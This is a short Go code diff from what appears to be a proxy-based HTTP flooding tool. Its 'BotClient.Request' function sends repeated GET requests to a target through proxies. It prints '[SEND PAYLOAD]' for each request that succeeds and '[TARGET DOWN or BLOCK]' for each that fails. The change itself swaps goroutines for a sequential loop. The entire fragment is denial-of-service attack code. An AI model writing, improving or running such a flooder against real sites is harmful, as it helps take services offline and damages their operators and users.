@@ -46,20 +46,16 @@ func(c *BotClient) Request(proxy string) error{
 
 	req = req.GET(c.Target)
 	for i := 0 ; i < c.Concurrency; i ++ {
-		go func(){
-			resp := req.Send()
-			defer resp.Close()
+		resp := req.Send()
+		defer resp.Close()
 
-			if resp.Error() == nil {
-				// SUCCESS
-				fmt.Printf("\x1b[33m[SEND PAYLOAD]\x1b[0m \x1b[1m %s\r", proxyUri.Host)
-			} else {
-				// FAILURE
-				fmt.Printf("\x1b[31m[TARGET DOWN or BLOCK]\x1b[0m \x1b[1m %s\r", proxyUri.Host)
-			}
-
-			
-		}()
+		if resp.Error() == nil {
+			// SUCCESS
+			fmt.Printf("\x1b[33m[SEND PAYLOAD]\x1b[0m \x1b[1m %s\r", proxyUri.Host)
+		} else {
+			// FAILURE
+			fmt.Printf("\x1b[31m[TARGET DOWN or BLOCK]\x1b[0m \x1b[1m %s\r", proxyUri.Host)
+		}
 	}
 
 	return nil
